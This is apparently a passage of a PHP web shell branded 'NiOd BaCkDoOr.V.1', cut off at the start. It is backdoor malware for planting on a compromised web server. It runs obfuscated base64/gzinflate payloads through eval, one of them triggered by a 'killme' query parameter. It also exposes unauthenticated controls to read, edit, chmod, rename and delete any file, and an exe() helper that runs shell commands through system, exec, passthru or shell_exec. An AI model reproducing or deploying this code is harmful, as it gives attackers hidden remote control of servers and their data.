eval(gzinflate(base64_decode('hVbbbuM2EH0PkH+YJYSVXNgy0CL7EFsucnG3C6TJIva2KALDoCXK4la3iNS6cZF/L4ekLrHdrR7smHPmcOacIRUWJgW406SaTcuKzaYhyyWrZu7k/IyZUFxUGdBQ8iIPfo42UZ2VkDGZFFFQFkLOzs9uqaQbKhjcqtj52YJV31gF9rmEKc/LWoJ8KVkg2d8ScpqxQBiU4HsWXPyoWL6oFYx8P61uUF3iZyrErqii7yeWDapLxLqvse57JPyvxGhzsN/tNSwVpOtPK9STpFGLWLnIbCpYykJLaJCzaVEiCuAbTWsWkO2eK+RH9Tkdm1ALsQjxnJLZ4jnt4mPDq4qytYepajMg+sd+U0tiuhH1JuOy4QFt1DsAApg5xvoVl7V+OtaDIMKKl1IPAgCPwXPWnx8Wyye3ccBdwfv30Kwald6umUbd1eAf5HAiKhkEgF8e+XOUjSIymJjIxk5D0OaaBXfVAHDXXrgrogGgvz1AY3cH0C4GRwWbcMxTDBIUZmTBI10xMQDTSy+/aa7Tx05A4CqfXNsz8gYnWH300m5dBnFRstzT4CHZWVVeWSrY/7P4231LpMrb7k9y4Udc53ouYVdxZQEy0AHoHbZpsaEpUhzZ3fSJfXWNxZYjLoeG56Dk7b4DQB+hK8leFNM6LPIcD4XX+j9snB42jposgzezvo42nhXBTo+6fFKG3hvYc82qF/DI4teHP2B5dX03X1gVdgm67Dm8xcZMhsmaVhV98SzPwEqCj0Y6/Mld6tCa52vXt5sb4zUqrJgZ7WPSEyXdPM6vlnNTGRDf4YNBS2VFM4RP7o0h1ru7K59M8px0YEdRH3c9v5vfLOEH+OXx4TdD3yagrQad19m6KnbCQ45+x7oIK5MCHPSkVk5m4KMuEUbDxOZRAc5XCGbg/HUCq6tXsCfn6wpPnUt8sw0TIS3ZWsiK51tP5foqNjlMfz1cMLKRT/eL+eMSPt0vH9C636/uvswXHvF5VqZFpABDMtT7KtrBpC/lG9bX9sQcHOve+IdpIVCjuDyefB0zIc2SMBqxyiM3hbpfczm65UK9JTgexUugUirVMrU+ATyz+g1BwDeH3pAfEuDbR2WWZcpDijTjqNjlaUGbC/Uw4Y7lW5lcAvIiLb7LzBVhZy9Oa5F4+Hd3k/QvJSDV2zP0LmZFrHsc4GrrsP6fIVaTEJmj/+Hi4qcPnc7dPs2d1BPLLv4L')));
} elseif($_GET['niod'] == 'killme') {
eval(gzinflate(base64_decode('U0nLzEnNzMtUsFVQiQ92DQpzDYpWD3YO8gwIiXfz9HH1c/R1VY+15uUqyk3JLNJQTy3LzCkpz8yLL67MVde0hopm5OemInggNfFgRWUZ+cUlqBJg8eT8vDSgcGleTmZetoYK1A2aQGtSkzPyFdSdKlNTUxWKEysT89L19BSsNNStAQ==')));
}
echo "</td></tr>";
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="#FFFFFF">Chmod OK</font><br/>';
}else{
echo '<font color="#B0B0B0">Chmod ERROR!</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="#FFFFFF">Rename OK</font><br/>';
}else{
echo '<font color="#B0B0B0">Rename ERROR!</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="#FFFFFF">Edit File OK</font><br/>';
}else{
echo '<font color="#B0B0B0">Edit File ERROR!</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="#FFFFFF">Delete DIR OK</font><br/>';
}else{
echo '<font color="#B0B0B0">Delete DIR ERROR!</font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="#FFFFFF">Delete OK</font><br/>';
}else{
echo '<font color="#B0B0B0">Delete ERROR!</font><br/>';
}
}
}
echo '</center>';
if(function_exists('opendir')) {
	if($opendir = opendir($path)) {
		while(($readdir = readdir($opendir)) !== false) {
			$scandir[] = $readdir;
		}
		closedir($opendir);
	}
	sort($scandir);
} else {
	$scandir = scandir($path);
}
echo '<div id="content"><table width="900" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="NioD">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permission</center></td>
<td><center>Modify</center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo "<br><center><a href='mailto:noniod77@gmail.com'>NiOd BaCkDoOr.V.1</a> <font color=#C7C7C7>by</font> <a href='mailto:noniod77@gmail.com'>Noniod7</a></center>
</body>
</html>";
function exe($cmd) { 	
if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function perms($file){
$perms = fileperms($file);
 
if (($perms & 0xC000) == 0xC000) {
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
$info = 'p';
} else {
$info = 'u';
}

$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
